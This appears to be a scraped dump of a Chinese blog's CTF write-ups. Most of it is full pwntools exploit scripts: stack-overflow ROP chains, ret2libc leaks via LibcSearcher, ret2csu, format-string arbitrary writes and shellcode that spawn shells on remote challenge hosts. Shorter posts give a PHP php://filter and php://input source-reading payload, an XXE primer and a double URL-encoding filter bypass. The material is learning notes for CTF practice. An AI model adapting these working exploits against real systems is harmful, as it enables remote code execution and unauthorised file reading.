7.stack232位程序 我们现在v13处下断点 之后再在return 0 处下断点 这样的话可以让我们找到输入数字的栈地址，更改时的栈地址，以及在跳入return 0 之前以及执行ret汇编指令之前的变化情况从而获取偏移量 改变了v13[1] https://blog.csdn.net/xi_niuniu/article/details/44978207 ret 可以理解为pop eip 那么我们在还没有执行ret的时候 eip指向的为返回地址，而此时还没有pop eip 所以现在esp指向的栈地址即为返回地址所在的位置，也就是我们想要的偏移地址最低位字节的地址 通过这个我们可以计算offset = （0x43cc-4348）= 0x84 这是最难的地方 其次，从其他大佬wp可知，本体的靶机并没有bash，所以使用原来的后门没有用 因此我们要构造一个rop 1.call system指令地址 2.sh 写exp： 12345678910111213141516171819202122232425262728293031323334353637383940414243#!/usr/bin/python2#encoding:utf-8#__author__='summerN@DL&amp;S'from pwn import *from LibcSearcher import *file_name = './1'libc_name = ''ip = '111.198.29.45'port = '37458'# context.arch = 'amd64'context.log_level='debug'context.terminal=['tmux','split','-h']#libc = ELF(libc_name)elf = ELF(file_name)p = remote(ip,port)offset = 0x84sh_add = 0x08048987call_sys = 0x080485B4def addr(offset,size): p.sendline('3') p.recvuntil(\"which number to change:\") p.sendline(str(offset)) p.recvuntil(\"new number:\") p.sendline(str(size))p.recvuntil(\"How many numbers you have:\\n\")p.sendline(\"1\")p.recvuntil(\"Give me your numbers\\n\")p.sendline(\"255\")addr(offset,0xB4)addr(offset+0x1,0x85)addr(offset+0x2,0x04)addr(offset+0x3,0x08)addr(offset+0x4,0x87)addr(offset+0x5,0x89)addr(offset+0x6,0x04)addr(offset+0x7,0x08)#p.recv()p.sendline(\"5\")p.interactive() 8.pwn100 本题设计了中级rop中的ret init 1.我们首先使用puts获得libc基地址 但是别忘了将收到的地址去掉不该有的东西，例如“\\n”，我这个铁憨憨就因为这个狗东西废了一个小孩是 2.得到libc版本以及system与str_bin_sh 3.构造rdi ret getshell 注意： 1.本题有很多解决方法，但是我感觉只需要rdi ret 这个gadget就可以 应该是最简单的方法 2.注意ret2__libc_csu_init的使用方法，被调函数要是用其got地址 exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#!/usr/bin/python2#encoding:utf-8#__author__='summerN@DL&amp;S'from pwn import *from LibcSearcher import *file_name = './1'libc_name = ''ip = '111.198.29.45'port = '44187'# context.arch = 'amd64'context.log_level='debug'context.terminal=['tmux','split','-h']#libc = ELF(libc_name)elf = ELF(file_name)p = remote(ip,port)#p = process(file_name)pop_rdi = 0x0000000000400763offset = 0x40fakeebp = 1csu_end_addr = 0x000000000040075Acsu_front_addr = 0x0000000000400740main_add = 0x4006B8puts_plt = elf.plt['puts']print puts_pltstart_got = elf.got['__libc_start_main']puts_got = elf.got['puts']def csu(rbx, rbp, r12, r13 , r14, r15, last): #这里的r13 r14 r15 分别为第三 第二 第一个参数 # pop rbx,rbp,r12,r13,r14,r15 # rbx should be 0, # rbp should be 1,enable not to jump # r12 should be the function we want to call # rdi=edi=r15d # rsi=r14 # rdx=r13 payload = 'a' * 0x40 + p64(fakeebp) payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64( r13) + p64(r14) + p64(r15) #此时的r12应为被调用函数的got表地址 payload += p64(csu_front_addr) payload += 'a' * 0x38#0x38的原因看笔记 payload += p64(last) #sh.send(payload) #sleep(1) return payload.ljust(200,\"a\")#payload1 = csu(0,1,puts_got,0,0,start_got,main_add)payload1 = 'a' * 0x48 + p64(pop_rdi) + p64(start_got) + p64(puts_plt) + p64(main_add)#print payload1p.send(payload1.ljust(200,\"a\"))p.recvuntil(\"bye~\\n\")start_add = u64(p.recv().strip(\"\\n\").ljust(8,\"\\x00\"))print hex(start_add)libc = LibcSearcher(\"__libc_start_main\",start_add)libc_base = start_add - libc.dump(\"__libc_start_main\")print hex(libc_base)bin_add = libc_base + libc.dump(\"str_bin_sh\")sys_add = libc_base + libc.dump(\"system\")payload2 = \"a\" * 0x48 + p64(pop_rdi) + p64(bin_add) + p64(sys_add) + p64(main_add)p.send(payload2.ljust(200,\"a\"))p.interactive() 9.pwn200很简单的rop 123456789101112131415161718192021222324252627282930313233343536#!/usr/bin/python2#encoding:utf-8#__author__='summerN@DL&amp;S'from pwn import *from LibcSearcher import *file_name = './1'libc_name = ''ip = '111.198.29.45'port = '55665'# context.arch = 'amd64'context.log_level='debug'context.terminal=['tmux','split','-h']#libc = ELF(libc_name)elf = ELF(file_name)#p = process(file_name)p = remote(ip,port)write_plt = elf.plt['write']main_got = elf.got['__libc_start_main']main = 0x80484BEpayload1 = \"a\" * (0x6c+0x4) + p32(write_plt)+ p32(main) +p32(1) + p32(main_got) + p32(4)#gdb.attach(p)p.recv()p.send(payload1)main_libc = u32(p.recv().strip('\\n').ljust(4,'\\x00'))print main_libclibc = LibcSearcher('__libc_start_main',main_libc)libc_base = main_libc - libc.dump('__libc_start_main')sys_add = libc_base + libc.dump('system')bin_add = libc_base + libc.dump('str_bin_sh')payload2 = \"a\" * (0x6c+0x4) + p32(sys_add) + p32(1) + p32(bin_add) p.send(payload2)p.interactive() 10.welpwn参考：https://blog.csdn.net/seaaseesa/article/details/102944448 这里主要考察堆栈结构 1234567891011121314151617181920212223242526272829303132333435363738394041#!/usr/bin/python2#encoding:utf-8#__author__='summerN@DL&amp;S'from pwn import *from LibcSearcher import *file_name = './1'libc_name = ''ip = '111.198.29.45'port = '58639'# context.arch = 'amd64'context.log_level='debug'context.terminal=['tmux','split','-h']#libc = ELF(libc_name)elf = ELF(file_name)p = remote(ip,port)puts_plt = elf.plt['puts']main_got = elf.got['__libc_start_main']write_got = elf.got['write']start_add = 0x4007cdpop_rdi = 0x00000000004008a3pop_4p = 0x000000000040089cpayload = \"a\" * 0x18 + p64(pop_4p) + p64(pop_rdi) + p64(main_got) + p64(puts_plt) + p64(start_add)#这里的话要搞清楚为什么需要pop_4p，因为我们需要绕过24个‘a’与pop_4p的地址，去ret我们pop_rdi，以便于继续执行#p.recvuntil('Welcome to RCTF\\n')p.recv()p.send(payload)p.recvuntil('\\x08@')main_add = u64(p.recvline().strip('\\n').ljust(8,'\\x00'))#这里接受7个字节是因为第八个字节为\\x0a其转移字符为换行符，并且其字符是个莫名其妙的东西，做题时会卡在Libcsearch那不动，以后注意print hex(main_add)libc = LibcSearcher('__libc_start_main',main_add)libc_base = main_add - libc.dump('__libc_start_main')#print libc_basesys_add = libc_base + libc.dump('system')bin_add = libc_base + libc.dump('str_bin_sh')payload0 = \"a\" * 0x18 + p64(pop_4p) + p64(pop_rdi) + p64(bin_add) + p64(sys_add) + p64(start_add)p.recvuntil('\\n')p.sendline(payload0)p.interactive()","categories":[],"tags":[]},{"title":"php伪协议","slug":"php伪协议","date":"2020-01-12T13:30:55.096Z","updated":"2020-01-12T13:32:10.954Z","comments":true,"path":"2020/01/12/php伪协议/","link":"","permalink":"http://summern.club/2020/01/12/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/","excerpt":"php伪协议","text":"php伪协议 看一道题 上图 可知涉及到php伪协议的问题 1.在file_get_contents 这里 我们可以使用php://这个协议php://input可以得到原始的post数据 2.在include（）这里我们可以看到后面有个提示hint.php 但是我们把file=hint.php时仍然没有任何代码 我们可以使用： php://filter/convert.base64-encode/resource=取源代码并进行base64编码输出 若不使用base64编码，我们读取的内容会直接当做php代码执行就看不到源代码内容了。 上payload 123?Yeedo&#x3D;php:&#x2F;&#x2F;input&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;hint.phppost:Yeedo is a big hacker 解码base64 得到 123&lt;?php //decode(423e1e68bdc71183573da0cd33a1609)='ypcwelcome';?&gt; 在之前的payload基础上添加 1password&#x3D;ypcwelcome 得到flag 1flag&#123;1a19cbc0200dc984ae400d331a7d1a3d&#125;","categories":[],"tags":[]},{"title":"第四季答题赛 pwn","slug":"第四季答题赛 pwn","date":"2019-12-29T02:28:53.523Z","updated":"2019-12-29T02:29:34.452Z","comments":true,"path":"2019/12/29/第四季答题赛 pwn/","link":"","permalink":"http://summern.club/2019/12/29/%E7%AC%AC%E5%9B%9B%E5%AD%A3%E7%AD%94%E9%A2%98%E8%B5%9B%20pwn/","excerpt":"i春秋·第四季答题赛 pwn","text":"i春秋·第四季答题赛 pwn 1.Self-service Refueling System这个题要注意我们覆盖的地址为main函数的返回地址，所以要知道我们接受的 __libc_start_main 地址之前要接受的字符串 在做这个题的时候问题就出现在的 1.接受地址的时候没有去掉\\n 2.忘记了将我们覆盖的地方是main函数的返回地址 exp： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#!/usr/bin/python2#encoding:utf-8#__author__='summerN@DL&amp;S'from pwn import *from LibcSearcher import *file_name = './2'#libc_name = '/lib/x86_64-linux-gnu/libc.so.6'ip = '120.55.43.255'port = '23810'# context.arch = 'amd64'context.log_level='debug'context.terminal=['tmux','split','-h']#libc = ELF(libc_name)elf = ELF(file_name)#p = process(file_name)p = remote(ip,port)read_got = elf.got['__libc_start_main']puts_plt = elf.plt['puts']pop_rdi = 0x0000000000400fb3main = 0x400EAApayload = \"a\" * (0x20 - 0x8) + p32(26214) + p32(9011)+ p64(8) + p64(pop_rdi) + p64(read_got) + p64(puts_plt) + p64(main)#payload = \"a\" * (0x20) +p64(8) + p64(pop_rdi) + p64(read_got) + p64(puts_plt) + p64(main)print p.recvuntil(\"Do you want to refuel?(y/n)\\n\")p.sendline(\"y\")print p.recvuntil(\"Plz input your Gas Card ID :\\n\")p.sendline(payload)p.sendlineafter(\"ou want?(L)\\n\",\"1L\")print p.recvuntil(\"gas\\n\")print p.recvuntil(\"\\x30\\x6d\")add = u64(p.recvline().strip(\"\\n\").ljust(8,\"\\x00\"))#print p.recvline()print hex(add)libc = LibcSearcher(\"__libc_start_main\",int(add))libc_add = add - libc.dump(\"__libc_start_main\")print libc_addbin_add = libc_add + libc.dump(\"str_bin_sh\")sys_add = libc_add + libc.dump(\"system\")ret = 0x4008B1payload2 = \"a\" * (0x20 - 0x8) + p32(26214) + p32(9011)+ p64(8) + p64(pop_rdi) + p64(bin_add)+p64(sys_add)print p.recvline()#print p.recvuntil(\"Do you want to refuel?(y/n)\")p.sendline(\"y\")print p.recvuntil(\"Plz input your Gas Card ID :\\n\")p.sendline(payload2)p.sendlineafter(\"How mang gas do you want?(L)\\n\",\"1L\")#gdb.attach(p)p.interactive()","categories":[],"tags":[]},{"title":"攻防世界新手区pwn","slug":"攻防世界新手区pwn","date":"2019-12-22T13:26:27.160Z","updated":"2019-12-29T02:29:45.741Z","comments":true,"path":"2019/12/22/攻防世界新手区pwn/","link":"","permalink":"http://summern.club/2019/12/22/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E5%8C%BApwn/","excerpt":"攻防世界新手区pwn","text":"攻防世界新手区pwn 1 ncnc 链接获取flag 2知识： 关于stdin的知识见博客：https://blog.csdn.net/xmzzy2012/article/details/80584910 即：在c语言中表现为调用printf函数将内容输出到终端上。 这里使用的知识点为任意地址写入： 我们先找到偏移量 通过查看找到偏移量offset为：10 之后我们就可以使用任意地址写 上exp 12345678910111213 #coding=utf-8from pwn import *p = remote(\"111.198.29.45\",46545)offset = 10pwnme_add = 0x804a068print p.recvuntil(\"name:\\n\")p.sendline(\"summerN\")print p.recvuntil(\"please:\\n\")payload = p32(pwnme_add) + \"%4c%10$hhn\"p.sendline(payload)print p.recv() 3首先查看保护 发现开启了栈溢出保护但是对于这个题来说貌似没什么卵用 看完程序，发现直接从get（）那里溢出进入v5直接覆盖就好 exp如下： 123456789101112#coding=utf-8from pwn import *context(os='linux', arch='amd64', log_level='debug')p = remote(\"111.198.29.45\",59473)print p.recvuntil(\"What's Your Birth?\\n\")p.sendline(\"12\")print p.recvuntil(\"What's Your Name?\\n\")payload = \"A\" * 8 + p64(1926)p.sendline(payload)print p.recvall() 4先checksec一下 64位 bss数据区覆盖一下就可以 exp: 123456789from pwn import *context(os='linux', arch='amd64', log_level='debug')p = remote(\"111.198.29.45\",33733)p.recvuntil(\"lets get helloworld for bof\\n\")x = hex(1853186401)print xpayload = \"BBBB\" + p64(0x6e756161)p.sendline(payload)p.recvall() 注意： p64这类打包函数不可以使用例如x = hex(11)这类的函数 而可以使用直接对变量赋值的变量例如x = 11 5先check 看IDA exp: 1234567891011#encoding=utf-8from pwn import *context(os='linux', arch='amd64', log_ level='debug')p = remote(\"111.198.29.45\",59602)bin_add = 0x400596p.recvuntil(\"Hello, World\\n\")payload = 'a' * (0x80 + 8) + p64(bin_add)p.sendline(payload)p.interactive() 6这里的话就是构造32位程序的ROP链 注意这种问题在使用elf.symbols()获取的system（）函数的地址 32位会出现，64位应该不会，所以32位多填充p32(),64位多填充p64() 也就是说只要是搜索出的call system（不是自己定义的危险函数）在system 与其后面的参数之间就要间隔对应的参数 很简单，但是遇到了一个问题 1.如果直接使用后text段的system地址的话，就很好说，不用废话 12345678910#encoding=utf-8from pwn import *context(os='linux', arch='amd64', log_level='debug')p = remote(\"111.198.29.45\",32152)bin_add = 0x0804a024sys_add = 0x804849epayload = \"a\" * (0x88 + 4) + p32(sys_add) + p32(bin_add)p.recvuntil(\"Input:\\n\")p.sendline(payload)p.interactive() 2.但是如果使用.plt段的system函数的真实地址的话就不大行了 exp 12345678910#encoding=utf-8from pwn import *context(os='linux', arch='amd64', log_level='debug')p = remote(\"111.198.29.45\",32152)bin_add = 0x0804a024sys_add = 0x8048320payload = \"a\" * (0x88 + 4) + p32(sys_add)+ \"a\" *4 + p32(bin_add)p.recvuntil(\"Input:\\n\")p.sendline(payload)p.interactive() 具体是因为什么我也不清楚 总之先记住 如果是从libc泄露的system的话。。。。应该是第二种了吧 看下我自己的认为。。 在使用.plt段的system时 看这个哈 我们输入的bin/sh因该位于ptr 向后4个的位置，往后看你会发先会有一个call的指令 我们都知道call会向栈中push一个下一条指令的地址（貌似是在str的位置，具体也不清楚） 因此我们要先将这个地址覆盖之后我们才可以传入bin/sh 就先这样理解吧。。。。 其实刚才那样理解就是这个意思： 跟栈帧结构有关，每个函数的栈结构是实参‘/bin/sh’压在返回地址之前，调用system函数时，构造伪栈帧需要返回地址，然后取实参。返回地址在这里随便写就行就先这样吧。。 7先增加一个知识，函数指针 http://c.biancheng.net/view/228.html 关于函数指针的介绍 再来看这里 这里把v1这个void类型指针先强制类型转化为一个返回八字节的函数指针 通过read函数向其赋值地址 再来增加几个知识： alarm()可以用来限制运行时间，干扰调试 mmap（）可以开辟出一片可读可写的内存空间 我们来找偏移 从IDA上可以看到，我们可以a1的地址存放到偏移量为7的地方，所以构造以下字符串 构造payload = %85d%7&amp;n exp： 123456789101112131415161718192021222324#encoding=utf-8from pwn import *context(os='linux', arch='amd64', log_level='debug')p = remote(\"111.198.29.45\",54738)print p.recvuntil(\"secret[0] is \")v3 = p.recvline().strip(\"\\n\")v3_add = int((\"0x\" + str(v3)),16)print v3_addprint p.recvuntil(\"What should your character's name be:\\n\")p.sendline(\"a\")print p.recvuntil(\"So, where you will go?east or up?:\\n\")p.sendline(\"east\")print p.recvuntil(\"o into there(1), or leave(0)?:\\n\")p.sendline(\"1\")print p.recvuntil(\"'Give me an address'\\n\")p.sendline(str(v3_add))print p.recvuntil(\"And, you wish is:\\n\")payload = \"%85c%7$n\"p.sendline(payload)print p.recvuntil(\"Wizard: I will help you! USE YOU SPELL\\n\")shellcode = asm(shellcraft.sh())print shellcodep.sendline(shellcode)p.interactive() 注意：！！！！！ 在写shellcode的时候最好加一下context 8srand()​ srand()为初始化随机数发生器，用于设置rand()产生随机数时的种子。传入的参数seed为unsigned int类型，通常我们会使用time(0)或time(NULL)的返回值作为seed。 rand()​ rand()函数是使用线性同余法做的，它并不是真的随机数，因为其周期特别长，所以在一定范围内可以看成随机的。​ rand()函数不需要参数，它将会返回0到RAND_MAX之间的任意的整数。 这里用到了python与c语言交互的一个库 关于ctype库与dll我们使用python标准库中自带的ctypes模块进行python和c的混合编程libc共享库可以使用ldd查找 注意，我们在使用sendlineafter()函数的时候不可以加上\\n，这样的话是无法识别的 同时输入的为字符串形式 上exp 1234567891011121314#encoding=utf-8from pwn import *from ctypes import *#p = process(\"./1\")p = remote(\"111.198.29.45\",38308)libc = cdll.LoadLibrary(\"/lib/x86_64-linux-gnu/libc.so.6\")context.log_level='debug'#print p.recvuntil(\"Your name:\\n\")payload = 'a' * 32 + p64(1)p.sendlineafter(\"name:\",payload)for i in range(10): p.sendlineafter(\"number:\",str(libc.rand()%6 + 1))print p.recvall() 9 整数溢出知识点：整数溢出 详情见自己写的博客或ctf_wiki 12345678910111213141516171819#encoding=utf-8#Author:summerNfrom pwn import *p = remote(\"111.198.29.45\",51446)#p = process(\"./1\")print p.recvuntil(\"Your choice:\")payload1 = \"1\"p.sendline(payload1)print p.recvuntil(\"Please input your username:\\n\")payload2 = \"summerN\"p.sendline(payload2)print p.recvuntil(\"Please input your passwd:\\n\")payload3 = \"a\" * (0x14 + 4) + p32(0x804868b)payload3 = payload3.ljust(259,'b') #范围p.sendline(payload3)print p.recvall() 10一个通过栈溢出漏洞使用write函数泄露libc基地址的题目 libc文件题目已经给出 获取基地址后基本的rop exp： 123456789101112131415161718192021222324252627282930313233343536373839404142434445#!/usr/bin/python2#encoding:utf-8#__author__='summerN@DL&amp;S'from pwn import *from LibcSearcher import *file_name = './level3'libc_name = 'libc_32.so.6'#libc_name = '/lib/i386-linux-gnu/libc.so.6'ip = '111.198.29.45'port = '42539'# context.arch = 'amd64'context.log_level='debug'context.terminal=['tmux','split','-h']libc = ELF(libc_name)elf = ELF(file_name)#p = process(file_name)p = remote(ip,port)offset = 0x88libc_got = elf.got[\"__libc_start_main\"]#print libc_gotwrite_plt = elf.plt[\"write\"]main = 0x8048484payload1 = \"a\" * (offset + 4) + p32(write_plt) + p32(main) #此处的main未返回地址payload1 += p32(1) + p32(libc_got) + p32(4)#使用write泄露libc基地址print payload1p.recvuntil(\"Input:\\n\")p.sendline(payload1)#gdb.attach(p)#p.recvuntil('@\\n')write_add = u32(p.recv(4).strip(\"\\n\").ljust(4,\"\\x00\"))print hex(write_add)libc_add = write_add - libc.symbols['__libc_start_main']sys_add = libc_add + libc.symbols['system']bin_add = libc_add + libc.search('/bin/sh').next()payload2 = \"a\" * (offset + 4) + p32(sys_add) + 'aaaa' + p32(bin_add)print p.recvuntil(\"Input:\\n\") p.sendline(payload2)p.interactive()","categories":[],"tags":[]},{"title":"安恒月赛暨北京工业大学","slug":"安恒月赛暨北京工业大学","date":"2019-12-21T12:40:17.896Z","updated":"2019-12-29T02:29:52.576Z","comments":true,"path":"2019/12/21/安恒月赛暨北京工业大学/","link":"","permalink":"http://summern.club/2019/12/21/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B%E6%9A%A8%E5%8C%97%E4%BA%AC%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6/","excerpt":"安恒月赛暨北京工业大学","text":"安恒月赛暨北京工业大学 pwn1.fantasy简单的栈溢出 exp： 123456789101112131415161718192021222324#!/usr/bin/python2#encoding:utf-8#__author__='summerN@DL&amp;S'from pwn import *file_name = './fantasy'libc_name = ''ip = '183.129.189.60'port = '10025'# context.arch = 'amd64'context.log_level='debug'context.terminal=['tmux','split','-h']#libc = ELF(libc_name)elf = ELF(file_name)p = remote(ip,port)offset = 0x30sys_add = 0x400735payload = \"a\" * (offset + 8) + p64(sys_add)p.recvuntil(\"input your message\\n\")p.sendline(payload)p.interactive() 2.how do cannary work这个题没有cannary保护 但是有挨千杀的出题人写的canary 这个cannary是由malloc传入的 用过gdb调试后发现是由两个变量比较 其中一个变量引入的是地址 另一个变量保存了进行check的字符串 我们只需找一个内存为0的地址传入，之后覆盖掉另一个变量为0即可 剩下的即为简单rop，调用puts泄露libc之后rop 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#!/usr/bin/python2#encoding:utf-8#__author__='summerN@DL&amp;S'from pwn import *from LibcSearcher import *file_name = './my_cannary'libc_name = '/lib/x86_64-linux-gnu/libc.so.6'ip = '183.129.189.60'port = '10026'# context.arch = 'amd64'context.log_level='debug'context.terminal=['tmux','split','-h']#libc = ELF(libc_name)elf = ELF(file_name)#p = process(file_name)p = remote(ip,port)offset = 0x40#puts_plt = elf.plt['puts']puts_plt = 0x400670print puts_pltputs_got = elf.got['puts']print puts_gotpop_add = 0x400a43main_add = 0x400998backdoor = 0x000000000600fe8 #地址指向为0payload1 = \"a\" * 0x30 + p64(backdoor) + p64(0x0) + \"a\" * 8 + p64(pop_add) + p64(puts_got) + p64(puts_plt) + p64(main_add)p.recvuntil(\"n\\n\")#payload1 = \"a\" * (offset + 8) + p64(pop_add) + p64(puts_got) + p64(puts_plt) + p64(main_add)p.sendline(payload1)#print p.recvall()put_add = u64(p.recvline().strip(\"\\n\").ljust(8,\"\\x00\"))print put_addlibc = LibcSearcher(\"puts\",put_add)libc_add = put_add - libc.dump(\"puts\")sys_add = libc_add + libc.dump(\"system\")bin_add = libc_add + libc.dump(\"str_bin_sh\")p.recvuntil(\"n\\n\")payload2 = \"a\" * 0x30 + p64(backdoor) + p64(0x0) + \"a\" * 8 + p64(pop_add)payload2 += p64(bin_add) + p64(sys_add)p.sendline(payload2)p.interactive()","categories":[],"tags":[]},{"title":"SWPUCTF","slug":"SWPUCTF","date":"2019-12-16T12:41:58.763Z","updated":"2019-12-29T02:32:05.379Z","comments":true,"path":"2019/12/16/SWPUCTF/","link":"","permalink":"http://summern.club/2019/12/16/SWPUCTF/","excerpt":"pwn2","text":"pwn2 先check 还可以、 这个题涉及了bss段的格式化字符串把漏洞，需要通过改写栈上的地址来挟持返回地址，之后再改写我们想输入的字符串（bin/sh） 难度在于 1.查找libc版本 2.改写链的地址 3.对于改写的话需要一个一个字节的去改写，具体看脚本 login.py 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586#!/usr/bin/python2#encoding:utf-8#__author__='pumpkin9@DL&amp;S'from pwn import *import sys# context(log_level='debug',terminal=['tmux','split','-h'],arch='amd64')file_name = './login'libc_name = '/lib/i386-linux-gnu/libc.so.6'ip = '108.160.139.79'port = '9090'# context.arch = 'amd64'# context.log_level='debug'context.terminal=['tmux','split','-h']lib = ELF(libc_name)elf = ELF(file_name)p = process(file_name)# p = remote(ip,int(port))li = lambda name,x : log.info(name+':0x%x'%x)ls = lambda name,x : log.success(name+':0x%x'%x)key = \"wllmmllw\"p.sendlineafter(\"Please input your name: \\n\",\"pumpkin9\")payload = \"%15$p\"p.sendlineafter(\"password: \\n\",payload)p.recvuntil(\"This is the wrong password: \")libc = int(p.recvuntil(\"\\n\",True),16)-241-lib.symbols['__libc_start_main']#获取libc基地址ls(\"libc addr\",libc)onegg = libc + lib.symbols['system']#获取system地址ls(\"one_gadget\",onegg)binsh = libc + lib.search('/bin/sh').next()#获取bin/sh地址ls(\"sh addr\",binsh)p.recvuntil(\"Try again!\\n\")p.sendline(\"%6$p\")p.recvuntil(\"This is the wrong password: \")stack = int(p.recvuntil(\"\\n\",True),16)#获取的是ebp中的内容target = stack -12 #这个的计算结果为返回地址ls(\"stack addr\",stack)ls(\"target addr\",target)gdb.attach(p)num = target&amp;0xff#进行按位与运算目的是除去多余的位数，在这里是保留后12位data1 = 0x100#onegg&amp;0xffdata2 = (onegg&amp;0xffff)&gt;&gt;8 #右移位运算获取第二个字符位data3 = (onegg&amp;0xffffff)&gt;&gt;16#获取第三个字符位data4 = onegg&gt;&gt;24#获取第四个字符位li(\"sys1\",data1)li(\"sys2\",data2)li(\"sys3\",data3)li(\"sys3\",data4)data5 = binsh&amp;0xff#同data1-4的作用data6 = ((binsh&amp;0xffff)&gt;&gt;8)data7 = ((binsh&amp;0xffffff)&gt;&gt;16)data8 = binsh&gt;&gt;24li(\"sh1\",data5)li(\"sh2\",data6)li(\"sh3\",data7)li(\"sh4\",data8)p.sendlineafter(\"Try again!\\n\",\"%\"+str(num)+\"c%6$hhn\")p.sendlineafter(\"Try again!\\n\",\"%\"+str(data1)+\"c%10$hhn\")p.sendlineafter(\"Try again!\\n\",\"%\"+str(num+1)+\"c%6$hhn\")p.sendlineafter(\"Try again!\\n\",\"%\"+str(data2)+\"c%10$hhn\")p.sendlineafter(\"Try again!\\n\",\"%\"+str(num+2)+\"c%6$hhn\")p.sendlineafter(\"Try again!\\n\",\"%\"+str(data3)+\"c%10$hhn\")p.sendlineafter(\"Try again!\\n\",\"%\"+str(num+3)+\"c%6$hhn\")p.sendlineafter(\"Try again!\\n\",\"%\"+str(data4)+\"c%10$hhn\")gdb.attach(p)p.sendlineafter(\"Try again!\\n\",\"%\"+str(num+8)+\"c%6$hhn\")#参数放到返回地址后面即可p.sendlineafter(\"Try again!\\n\",\"%\"+str(data5)+\"c%10$hhn\")#但是为什么要间隔四个字节呢p.sendlineafter(\"Try again!\\n\",\"%\"+str(num+9)+\"c%6$hhn\")#对于32位的程序根据libc中的system一般都要这样p.sendlineafter(\"Try again!\\n\",\"%\"+str(data6)+\"c%10$hhn\")#先记住p.sendlineafter(\"Try again!\\n\",\"%\"+str(num+10)+\"c%6$hhn\")p.sendlineafter(\"Try again!\\n\",\"%\"+str(data7)+\"c%10$hhn\")p.sendlineafter(\"Try again!\\n\",\"%\"+str(num+11)+\"c%6$hhn\")p.sendlineafter(\"Try again!\\n\",\"%\"+str(data8)+\"c%10$hhn\")#raw_input('#')p.sendlineafter(\"Try again!\\n\",key)p.interactive()","categories":[],"tags":[]},{"title":"web狗之xml实体攻击","slug":"web狗之xml实体攻击","date":"2019-12-16T02:37:33.979Z","updated":"2019-12-29T02:32:19.103Z","comments":true,"path":"2019/12/16/web狗之xml实体攻击/","link":"","permalink":"http://summern.club/2019/12/16/web%E7%8B%97%E4%B9%8Bxml%E5%AE%9E%E4%BD%93%E6%94%BB%E5%87%BB/","excerpt":"web狗之xml实体攻击浅学","text":"web狗之xml实体攻击浅学 我们先来了解一下xml 123456789101112&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;&lt;note&gt;&lt;to&gt;chybeta&lt;&#x2F;to&gt;&lt;from&gt;ph0en1x&lt;&#x2F;from&gt;&lt;&#x2F;note&gt;在上面代码中的第一行，定义XML的版本与编码。在XML文档中，所有的元素都必须正确的嵌套，形成树形结构。并且整个XML文档中必须要有一个根元素。如上代码，&lt;note&gt;是整个文档的根元素。嵌套在note标签中的&lt;to&gt;和&lt;from&gt;则是根的子元素。同时，所有的XML元素都必须有关闭标签，这点不像html语法那样松散。如果缺失关闭标签，则会导致XML解析失败。我们再了解一下实体： 123所有的XML文档都由五种简单的构建模块（元素，属性，实体，PCDATA CDATA）构成。这里着重介绍一下实体：实体是用于定义引用普通文本或特殊字符的快捷方式的变量，实体引用是对实体的引用。实体可在内部或外部进行声明。因此我们利用引入实体，构造恶意内容，从而达到攻击的目的。实体类型：XML实体分为四种：字符实体，命名实体，外部实体，参数实体。 文档类型定义：DTD 12345简单的说，DTD的作用是定义XML文档的合法构建模块。如前所述，实体也是构建模块之一。因此可以利用DTD来内部或外部引入实体。其基本格式：&lt;!DOCTYPE 根元素名 [ 元素描述 ]&gt; 内部引入格式： 将DTD和XML放在同一份文档中，利用DTD定义的实体即为内部实体。例如： 12345678910&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE xxe [&lt;!ENTITY chybeta &quot;Hello World!&quot;&gt;]&gt;&lt;xxe&gt;&amp;chybeta;&lt;&#x2F;xxe&gt; 访问该XML文档，&amp;chybeta;会被解析为Hello World!并输出。 外部引入基本格式： 12345&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt; 通过引用定义在外部的DTD中的实体，我们称之为外部实体。 之后呢，我们通过jarvis上的一道web题来尝试一下：http://web.jarvisoj.com:9882/我们先进行一下抓包之后呢我们发现第一个红箭头的位置，使用的是json方式传入我们改为xml，之后编写代码进行传入go后我们得到flag小白，还请多多关照","categories":[],"tags":[]},{"title":"urldecode二次编码绕过","slug":"urldecode二次编码绕过","date":"2019-12-16T02:37:33.963Z","updated":"2019-12-29T02:32:08.837Z","comments":true,"path":"2019/12/16/urldecode二次编码绕过/","link":"","permalink":"http://summern.club/2019/12/16/urldecode%E4%BA%8C%E6%AC%A1%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87/","excerpt":"代码审计日志三urldecode二次绕过","text":"代码审计日志三urldecode二次绕过 题目： 123456789101112131415161718192021&lt;?phpif(eregi(&quot;hackerDJ&quot;,$_GET[id])) &#123;echo(&quot;not allowed!&quot;);exit();&#125;$_GET[id] &#x3D; urldecode($_GET[id]);if($_GET[id] &#x3D;&#x3D; &quot;hackerDJ&quot;)&#123;echo &quot;Access granted!&quot;;echo &quot;flag&quot;;&#125;?&gt; 经过审计：由 1$_GET[id] &#x3D; urldecode($_GET[id]); 可知，我们需要将hackerDJ进行urldecode编码后get上传我们上传后得到：not allowed!再看url发现我们get传入的url编码值被浏览器自动解码因此我们需要再一次进行编码上传后得到flag","categories":[],"tags":[]},{"title":"sql语句之where字句学习笔记","slug":"sql语句之where字句学习笔记","date":"2019-12-16T02:37:33.948Z","updated":"2019-12-29T02:31:15.611Z","comments":true,"path":"2019/12/16/sql语句之where字句学习笔记/","link":"","permalink":"http://summern.club/2019/12/16/sql%E8%AF%AD%E5%8F%A5%E4%B9%8Bwhere%E5%AD%97%E5%8F%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"sql语句之where字句学习笔记","text":"sql语句之where字句学习笔记 我们先说一下wherer字句作用： 1限制表中的数据返回 符合where后面的条件的数据就会被选中，不符合where条件的语句会被过滤掉 